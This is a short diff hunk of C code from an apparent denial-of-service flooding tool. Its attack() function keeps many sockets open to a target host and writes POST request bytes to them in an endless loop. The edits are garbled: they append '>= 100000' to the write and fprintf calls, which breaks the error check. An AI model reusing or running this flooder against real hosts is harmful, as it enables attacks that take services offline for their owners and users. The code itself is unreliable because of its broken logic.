@@ -55,16 +55,16 @@ void attack(char *host, char *port, int id) {
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(100000) {
+	while(1) {
 		for(x=0; x < CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1);
+			r=write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1) >= 100000;
 			if(r == -1) {
 				
 				sockets[x] = make_socket(host, port);
 			} else
-//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r) >= 100000;
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
 		fprintf(stderr, "[%i: Voly Sent]\n", id);
